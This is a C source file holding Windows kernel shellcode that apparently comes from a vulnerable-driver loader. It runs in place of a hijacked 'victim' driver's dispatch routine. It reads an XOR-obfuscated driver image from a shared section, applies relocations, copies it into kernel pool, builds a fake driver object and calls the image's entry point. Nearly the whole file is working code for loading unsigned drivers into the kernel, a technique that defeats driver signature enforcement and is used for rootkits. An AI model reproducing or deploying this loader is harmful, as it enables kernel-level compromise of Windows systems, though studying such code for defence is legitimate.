
/*
* ScDispatchRoutineV3
*
* Purpose:
*
* Bootstrap shellcode variant 3.
* Read image from shared section, process relocs, allocate driver object and run driver entry point.
* 
* N.B. This shellcode version is for a very specific use only. Refer to docs for more info.
*
* IRQL: PASSIVE_LEVEL
*
*/
NTSTATUS NTAPI ScDispatchRoutineV3(
    _In_ struct _DEVICE_OBJECT* DeviceObject,
    _Inout_ struct _IRP* Irp,
    _In_ PSHELLCODE ShellCode)
{
    NTSTATUS                        status;
    ULONG                           isz;
    ULONG_PTR                       Image, exbuffer, pos;

    PIO_STACK_LOCATION              StackLocation;

    PIMAGE_DOS_HEADER               dosh;
    PIMAGE_FILE_HEADER              fileh;
    PIMAGE_OPTIONAL_HEADER          popth;
    PIMAGE_BASE_RELOCATION          rel;

    DWORD_PTR                       delta;
    LPWORD                          chains;
    DWORD                           c, p, rsz, k;

    PUCHAR                          ptr;

    PKEVENT                         ReadyEvent;
    PVOID                           SectionRef, pvSharedSection = NULL, IopInvalidDeviceIoControl;
    SIZE_T                          ViewSize;

    PPAYLOAD_HEADER_V3              PayloadHeader;

    ULONG                           objectSize;
    HANDLE                          driverHandle;
    PDRIVER_OBJECT                  driverObject;
    OBJECT_ATTRIBUTES               objectAttributes;
    UNICODE_STRING                  driverName, regPath;

#ifdef ENABLE_DBGPRINT
    CHAR                            szFormat1[] = { 'S', '%', 'l', 'x', 0 };
    CHAR                            szFormat2[] = { 'F', '%', 'l', 'x', 0 };
#endif

#ifdef _DEBUG
    StackLocation = IoGetCurrentIrpStackLocationTest(Irp);
#else
    StackLocation = IoGetCurrentIrpStackLocation(Irp);
#endif

    if ((StackLocation->MajorFunction == IRP_MJ_CREATE)
        && (DeviceObject->SectorSize == 0))
    {

        status = ShellCode->Import.ObReferenceObjectByHandle(ShellCode->SectionHandle,
            SECTION_ALL_ACCESS, (POBJECT_TYPE) * (PVOID**)ShellCode->MmSectionObjectType, 0, (PVOID*)&SectionRef, NULL);

        if (NT_SUCCESS(status)) {

            ViewSize = ShellCode->SectionViewSize;

            status = ShellCode->Import.ZwMapViewOfSection(ShellCode->SectionHandle,
                NtCurrentProcess(),
                (PVOID*)&pvSharedSection,
                0,
                PAGE_SIZE,
                NULL,
                &ViewSize,
                ViewUnmap,
                0,
                PAGE_READWRITE);

            if (NT_SUCCESS(status)) {

                k = ShellCode->Tag;

                PayloadHeader = (PAYLOAD_HEADER_V3*)pvSharedSection;
                rsz = PayloadHeader->ImageSize;
                ptr = (PUCHAR)pvSharedSection + sizeof(PAYLOAD_HEADER_V3);

                do {
                    *ptr ^= k;
                    k = _rotl(k, 1);
                    ptr++;
                    --rsz;
                } while (rsz != 0);

                Image = (ULONG_PTR)pvSharedSection + sizeof(PAYLOAD_HEADER_V3);
                dosh = (PIMAGE_DOS_HEADER)Image;
                fileh = (PIMAGE_FILE_HEADER)(Image + sizeof(DWORD) + dosh->e_lfanew);
                popth = (PIMAGE_OPTIONAL_HEADER)((PBYTE)fileh + sizeof(IMAGE_FILE_HEADER));
                isz = popth->SizeOfImage;

                //
                // Allocate memory for mapped image.
                //
                exbuffer = (ULONG_PTR)ShellCode->Import.ExAllocatePoolWithTag(
                    NonPagedPool,
                    isz + PAGE_SIZE,
                    ShellCode->Tag) + PAGE_SIZE;

                if (exbuffer != 0) {

                    exbuffer &= ~(PAGE_SIZE - 1);

                    if (popth->NumberOfRvaAndSizes > IMAGE_DIRECTORY_ENTRY_BASERELOC)
                        if (popth->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress != 0)
                        {
                            rel = (PIMAGE_BASE_RELOCATION)((PBYTE)Image +
                                popth->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);

                            rsz = popth->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
                            delta = (DWORD_PTR)exbuffer - popth->ImageBase;
                            c = 0;

                            while (c < rsz) {
                                p = sizeof(IMAGE_BASE_RELOCATION);
                                chains = (LPWORD)((PBYTE)rel + p);

                                while (p < rel->SizeOfBlock) {

                                    switch (*chains >> 12) {
                                    case IMAGE_REL_BASED_HIGHLOW:
                                        *(LPDWORD)((ULONG_PTR)Image + rel->VirtualAddress + (*chains & 0x0fff)) += (DWORD)delta;
                                        break;
                                    case IMAGE_REL_BASED_DIR64:
                                        *(PULONGLONG)((ULONG_PTR)Image + rel->VirtualAddress + (*chains & 0x0fff)) += delta;
                                        break;
                                    }

                                    chains++;
                                    p += sizeof(WORD);
                                }

                                c += rel->SizeOfBlock;
                                rel = (PIMAGE_BASE_RELOCATION)((PBYTE)rel + rel->SizeOfBlock);
                            }
                        }

                    //
                    // Copy image to allocated buffer. We can't use any fancy memcpy stuff here.
                    //
                    isz >>= 3;
                    for (pos = 0; pos < isz; pos++)
                        ((PULONG64)exbuffer)[pos] = ((PULONG64)Image)[pos];

                    //
                    // Remember Victim IRP_MJ_PNP as invalid device request handler.
                    //
                    IopInvalidDeviceIoControl = DeviceObject->DriverObject->MajorFunction[IRP_MJ_PNP];

                    driverName.Buffer = PayloadHeader->ObjectName.Buffer;
                    driverName.Length = PayloadHeader->ObjectName.Length;
                    driverName.MaximumLength = PayloadHeader->ObjectName.MaximumLength;

                    InitializeObjectAttributes(&objectAttributes, &driverName, 
                        OBJ_PERMANENT | OBJ_CASE_INSENSITIVE, NULL, NULL);

                    //
                    // We cannot use IoCreateDriver here as it supply DriverEntry with NULL as registry path.
                    //

                    //
                    // Calculate object body size, number of bytes used by ObManager in ExAllocate* call.
                    // Must include driver object body and real size of driver extension which tail is opaque
                    // and different on various versions of NT. Assume 40 extra bytes (as on Win10) is currently enough.
                    // 
                    // N.B. Correct this size according to future IopDeleteDriver changes.
                    //
                    objectSize = sizeof(DRIVER_OBJECT) +
                        sizeof(DRIVER_EXTENSION) +
                        40;

                    status = PayloadHeader->ObCreateObject(KernelMode, *(POBJECT_TYPE*)PayloadHeader->IoDriverObjectType,
                        &objectAttributes, KernelMode, NULL, objectSize, 0, 0, (PVOID*)&driverObject);

                    if (NT_SUCCESS(status)) {

                        __stosb((PUCHAR)driverObject, 0, objectSize);

                        driverObject->DriverExtension = (PDRIVER_EXTENSION)(driverObject + 1);
                        driverObject->DriverExtension->DriverObject = driverObject;
                        driverObject->Type = IO_TYPE_DRIVER;
                        driverObject->Size = sizeof(DRIVER_OBJECT);
                        driverObject->Flags = DRVO_BUILTIN_DRIVER;
                        driverObject->DriverInit = (PDRIVER_INITIALIZE)(exbuffer + popth->AddressOfEntryPoint);

                        for (c = 0; c <= IRP_MJ_MAXIMUM_FUNCTION; c++)
                            driverObject->MajorFunction[c] = IopInvalidDeviceIoControl;

                        //
                        // Allocate DriverExtension->ServiceKeyName. Failure is insignificant.
                        // In case of NULL ptr IopDeleteDriver will handle this correctly.
                        //
                        driverObject->DriverExtension->ServiceKeyName.Buffer = (PWSTR)ShellCode->Import.ExAllocatePoolWithTag(PagedPool,
                            driverName.Length + sizeof(WCHAR), SHELL_POOL_TAG);
                        if (driverObject->DriverExtension->ServiceKeyName.Buffer) {
                            driverObject->DriverExtension->ServiceKeyName.MaximumLength = driverName.MaximumLength;
                            driverObject->DriverExtension->ServiceKeyName.Length = driverName.Length;
                            __movsb((PUCHAR)driverObject->DriverExtension->ServiceKeyName.Buffer, (UCHAR*)driverName.Buffer, driverName.Length);
                        }

                        status = PayloadHeader->ObInsertObject(driverObject, 0, FILE_READ_ACCESS, 0, NULL, &driverHandle);

                        if (NT_SUCCESS(status)) {

                            //
                            // Reference object so we can close driver handle without object going away.
                            //
                            status = ShellCode->Import.ObReferenceObjectByHandle(driverHandle, 0, *(POBJECT_TYPE*)PayloadHeader->IoDriverObjectType, 
                                KernelMode, (PVOID*)&driverObject, NULL);
                            if (NT_SUCCESS(status)) {

                                PayloadHeader->ZwClose(driverHandle);

                                //
                                // Allocate DriverObject->DriverName. Failure is insignificant.
                                // In case of NULL ptr IopDeleteDriver will handle this correctly.
                                //
                                driverObject->DriverName.Buffer = (PWSTR)ShellCode->Import.ExAllocatePoolWithTag(PagedPool,
                                    driverName.MaximumLength, SHELL_POOL_TAG);
                                if (driverObject->DriverName.Buffer) {
                                    driverObject->DriverName.MaximumLength = driverName.MaximumLength;
                                    driverObject->DriverName.Length = driverName.Length;
                                    __movsb((PUCHAR)driverObject->DriverName.Buffer, (UCHAR*)driverName.Buffer, driverName.Length);
                                }

                                regPath.Buffer = PayloadHeader->RegistryPath.Buffer;
                                regPath.Length = PayloadHeader->RegistryPath.Length;
                                regPath.MaximumLength = PayloadHeader->RegistryPath.MaximumLength;

                                //
                                // Call entrypoint.
                                //
#ifdef _DEBUG
                                status = DriverEntryTest(driverObject, &regPath);
#else
                                status = ((PDRIVER_INITIALIZE)(exbuffer + popth->AddressOfEntryPoint))(
                                    driverObject,
                                    &regPath);
#endif

                                //
                                // Driver initialization failed, get rid of driver object.
                                //
                                if (!NT_SUCCESS(status)) {

                                    PayloadHeader->ObMakeTemporaryObject(driverObject);
                                    ShellCode->Import.ObfDereferenceObject(driverObject);

                                }

                            } else {
                                //
                                // ObReferenceObjectByHandle failed.
                                // Attempt to get rid of bogus object.
                                //
                                PayloadHeader->ZwMakeTemporaryObject(driverHandle);
                                PayloadHeader->ZwClose(driverHandle);
                            }

                        } 
#ifdef ENABLE_DBGPRINT
                        //
                        // ObInsertObject failed switch, on fail ObManager dereference newly created object automatically.
                        //
                        else {
                            //
                            // ObInsertObject failed, output debug here.
                            //
                        }
#endif

                    }
#ifdef ENABLE_DBGPRINT
                    //
                    // ObCreateObject failed switch, no need to do anything.
                    //
                    else {
                        //
                        // ObCreateObject failed, output debug here.
                        //
                    }
#endif
                    //
                    // Save result.
                    //
                    PayloadHeader->IoStatus.Status = status;

                    //
                    // Block further IRP_MJ_CREATE requests.
                    //
                    DeviceObject->SectorSize = 512;

                } //ExAllocatePoolWithTag(exbuffer)

                ShellCode->Import.ZwUnmapViewOfSection(NtCurrentProcess(),
                    pvSharedSection);

            } //ZwMapViewOfSection(pvSharedSection)

            ShellCode->Import.ObfDereferenceObject(SectionRef);

            //
            // Fire the event to let userland know that we're ready.
            //
            status = ShellCode->Import.ObReferenceObjectByHandle(ShellCode->ReadyEventHandle,
                SYNCHRONIZE | EVENT_MODIFY_STATE, NULL, 0, (PVOID*)&ReadyEvent, NULL);
            if (NT_SUCCESS(status))
            {
                ShellCode->Import.KeSetEvent(ReadyEvent, 0, FALSE);
                ShellCode->Import.ObfDereferenceObject(ReadyEvent);
            }

        } // ObReferenceObjectByHandle success

    }
    ShellCode->Import.IofCompleteRequest(Irp, IO_NO_INCREMENT);
    return STATUS_SUCCESS;
}
